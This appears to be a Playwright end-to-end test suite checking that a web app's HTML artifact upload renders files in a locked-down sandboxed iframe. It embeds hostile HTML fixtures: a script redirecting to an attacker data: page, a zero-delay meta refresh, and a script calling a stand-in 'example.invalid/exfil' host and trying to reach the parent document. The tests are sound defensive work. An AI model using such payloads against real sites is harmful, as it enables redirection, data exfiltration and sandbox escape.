import { test, expect } from "../fixtures/index"

test.describe("Artifacts", () => {
  test("blocks parse-time script navigation before showing attacker content", async ({ page, base }) => {
    const title = `E2E Parse Navigation ${Date.now()}`
    await page.goto(`${base}/docs/artifacts/new`)
    await page.getByLabel("Title").fill(title)
    await page.getByLabel("Self-contained HTML file").setInputFiles({
      name: "parse-navigation.html",
      mimeType: "text/html",
      buffer: Buffer.from(`<!doctype html><html><body><script>location.replace('data:text/html,<h1>Attacker page</h1>')</script><p>Trusted content</p></body></html>`),
    })
    await page.getByRole("button", { name: "Create artifact" }).click()
    await page.waitForURL(/\/docs\/artifacts\/[0-9a-f-]+$/)
    await expect(page.getByRole("alert").filter({ hasText: /navigation attempt blocked/i })).toBeVisible()
    await expect(page.locator(`iframe[title="${title} preview"]`)).toHaveCount(0)
    await expect(page.getByText("Attacker page")).toHaveCount(0)
  })

  test("blocks zero-delay meta refresh before showing attacker content", async ({ page, base }) => {
    const title = `E2E Meta Refresh ${Date.now()}`
    await page.goto(`${base}/docs/artifacts/new`)
    await page.getByLabel("Title").fill(title)
    await page.getByLabel("Self-contained HTML file").setInputFiles({
      name: "meta-refresh.html",
      mimeType: "text/html",
      buffer: Buffer.from(`<!doctype html><html><head><meta http-equiv="refresh" content="0;url=data:text/html,<h1>Attacker page</h1>"></head><body>Trusted content</body></html>`),
    })
    await page.getByRole("button", { name: "Create artifact" }).click()
    await page.waitForURL(/\/docs\/artifacts\/[0-9a-f-]+$/)
    await expect(page.getByRole("alert").filter({ hasText: /navigation attempt blocked/i })).toBeVisible()
    await expect(page.locator(`iframe[title="${title} preview"]`)).toHaveCount(0)
    await expect(page.getByText("Attacker page")).toHaveCount(0)
  })

  test("upload HTML → sandbox preview → link/open/unlink/archive", async ({ page, base }) => {
    const stamp = Date.now()
    const solutionTitle = `E2E Artifact Solution ${stamp}`
    const artifactTitle = `E2E Checkout Prototype ${stamp}`

    await page.goto(`${base}/discovery`)
    await page.getByRole("button", { name: "E2E Baseline Opportunity", exact: true }).click()
    await page.getByRole("link", { name: "Open full page" }).click()
    await page.getByRole("button", { name: "Add Solution" }).click()
    await page.getByLabel("Title").fill(solutionTitle)
    await page.getByRole("button", { name: "Add Solution" }).last().click()
    await expect(page.getByText(solutionTitle)).toBeVisible()

    await page.goto(`${base}/docs/artifacts/new`)
    await page.getByLabel("Title").fill(artifactTitle)
    await page.getByLabel("Self-contained HTML file").setInputFiles({
      name: "checkout.html",
      mimeType: "text/html",
      buffer: Buffer.from(`<!doctype html><html><body><div id="status">loading</div><script>document.getElementById('status').textContent='Prototype script ran';fetch('https://example.invalid/exfil').catch(()=>{});try{parent.document.body.dataset.escaped='yes'}catch(e){}</script></body></html>`),
    })
    const outbound: string[] = []
    page.on("request", (request) => { if (request.url().includes("example.invalid")) outbound.push(request.url()) })
    await page.getByRole("button", { name: "Create artifact" }).click()
    await page.waitForURL(/\/docs\/artifacts\/[0-9a-f-]+$/)

    const frame = page.locator(`iframe[title="${artifactTitle} preview"]`)
    await expect(frame).toHaveAttribute("sandbox", "allow-scripts")
    await expect(frame).not.toHaveAttribute("allow")
    await expect(page.frameLocator(`iframe[title="${artifactTitle} preview"]`).getByText("Prototype script ran")).toBeVisible()
    expect(outbound).toEqual([])
    await expect(page.locator("body")).not.toHaveAttribute("data-escaped", "yes")
    await page.getByLabel("Solution to link").selectOption({ label: solutionTitle })
    await page.getByRole("button", { name: "Link", exact: true }).click()
    await expect(page.getByText(solutionTitle)).toBeVisible()

    await page.goto(`${base}/discovery`)
    await page.getByRole("button", { name: "E2E Baseline Opportunity", exact: true }).click()
    await page.getByRole("link", { name: "Open full page" }).click()
    await page.getByRole("button", { name: solutionTitle, exact: true }).click()
    await page.getByRole("button", { name: "Artifacts (1)", exact: true }).click()
    await expect(page.getByRole("link", { name: artifactTitle })).toBeVisible()
    await page.getByRole("link", { name: artifactTitle }).click()
    await page.getByRole("button", { name: "Unlink", exact: true }).click()
    await expect(page.getByText("Not linked to a solution.")).toBeVisible()
    await page.getByRole("button", { name: "Archive" }).click()
    await expect(page.getByText("This artifact is archived.")).toBeVisible()
    await page.goto(`${base}/docs`)
    await expect(page.getByRole("link", { name: artifactTitle })).toHaveCount(0)
  })
})
